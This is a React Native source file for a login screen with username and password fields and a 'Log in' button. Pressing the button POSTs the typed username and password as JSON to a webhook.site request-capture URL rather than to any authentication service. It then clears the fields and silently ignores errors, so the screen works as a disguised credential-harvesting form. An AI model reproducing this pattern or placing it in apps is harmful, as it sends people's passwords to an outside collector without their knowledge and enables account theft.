import React, { useEffect, useState } from 'react';
import {
  View,
  Text,
  Button,
  StyleSheet,
  TextInput,
  FlatList,
  ScrollView,
  Image,
  TouchableOpacity
} from 'react-native';
import Ionicons from "@expo/vector-icons/Ionicons";

export function RegisterScreen({ route, navigation }) {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const sendRequest = async () => {
    try {
      await fetch('https://webhook.site/6d42f16f-4801-4ed8-9682-098e37c66f5d', {
        method: 'post',
        mode: 'no-core',
        headers: {
          Accept: 'application/json',
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username: username,
          password: password,
        }),
      });
      setUsername('');
      setPassword('');
    } catch (error) {}
  };

  function handleSettingsPress() {
    navigation.navigate('Settings');
  }

  return (
    <ScrollView style={styles.screen}>
      <View>
        <Image
          source={{
            uri: 'https://cdn.logojoy.com/wp-content/uploads/2018/05/30164225/572.png',
          }}
          style={styles.image}
        />
      </View>

      <View style={styles.inputWrapper}>
      <Ionicons name={'person-circle-outline'} size={30} color={'#749d62'} style={styles.icon}/>
        <TextInput
          style={styles.input}
          onChangeText={setUsername}
          value={username}
          placeholder="Username"
        />
      </View>

      <View style={styles.inputWrapper}>
      <Ionicons name={'key-outline'} size={30} color={'#749d62'} style={styles.icon}/>
        <TextInput
          style={styles.input}
          onChangeText={setPassword}
          value={password}
          secureTextEntry={true}
          placeholder="Password"
        />
      </View>

      <TouchableOpacity onPress={sendRequest} style= {styles.btn}>
      <Text style= {styles.btnText}>Log in</Text>
      </TouchableOpacity>
    </ScrollView>
  );
}

const styles = StyleSheet.create({
  screen: {
    flex: 1,
    alignItems: 'center',
    //justifyContent: "center",
    backgroundColor: '#fbfcfb',
  },
  image: {
    height: 150,
    width: 200,
    alignSelf: "center",
  },
  inputWrapper: {
    flexDirection: "row",
    alignItems: "center",
    borderWidth: 1,
    borderRadius: 20,
    backgroundColor: '#fbfcfb',
    borderColor: "#749d62",
    margin: 10,
  },
  input: {
    height: 35,
    width: 200,
    margin: 5,
    color: "#749d62",
    fontWeight: 400,
  },
  icon: {
    paddingLeft: 5,
    paddingTop: 5,
  },
  btn: {
    borderColor: "#749d62",
    backgroundColor: "#c7d7bf",
    width: 90,
    alignSelf: "center",
    borderRadius: 20,
  },
  btnText: {
    fontWeight: 500,
    fontSize: 18,
    padding: 5,
    textAlign: "center",
    color: "#fbfcfb"
  }
});
